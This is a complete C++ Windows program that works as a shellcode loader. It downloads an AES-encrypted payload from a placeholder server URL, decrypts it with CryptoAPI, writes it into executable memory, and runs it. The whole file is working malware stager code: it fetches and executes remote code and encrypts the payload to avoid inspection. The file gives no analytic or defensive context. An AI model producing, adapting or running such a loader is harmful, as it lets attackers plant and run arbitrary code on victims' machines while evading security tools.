#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <vector>
#include <iostream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")


bool aes_decrypt(std::vector<unsigned char>& data, const BYTE* key, const BYTE* iv) {
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY hKey = NULL;
    HCRYPTHASH hHash = NULL;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    if (!CryptHashData(hHash, key, 16, 0)) return false;

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, CRYPT_EXPORTABLE, &hKey)) return false;

    // Set IV
    CRYPT_DATA_BLOB blob = { 16, (BYTE*)iv };
    CryptSetKeyParam(hKey, KP_IV, blob.pbData, 0);

    DWORD dataLen = data.size();
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dataLen)) return false;

    data.resize(dataLen);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

bool DownloadShellcode(const char* url, std::vector<unsigned char>& data) {
    HINTERNET hInternet = InternetOpenA("Mozilla", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    unsigned char buffer[4096];
    DWORD bytesRead = 0;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return true;
}


int main() {
    const char* url = "http://yourserver.com/payload.aes";
    BYTE key[16] = { /* 16-byte key */ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
    BYTE iv[16] = { 0 };  // Can also use random IV and prepend to payload

    std::vector<unsigned char> encryptedShellcode;

    if (!DownloadShellcode(url, encryptedShellcode)) {
        std::cerr << "Download failed.\n";
        return -1;
    }

    if (!aes_decrypt(encryptedShellcode, key, iv)) {
        std::cerr << "Decryption failed.\n";
        return -1;
    }

    LPVOID exec = VirtualAlloc(0, encryptedShellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, encryptedShellcode.data(), encryptedShellcode.size());

    ((void(*)())exec)();  // Execute shellcode
    return 0;
}

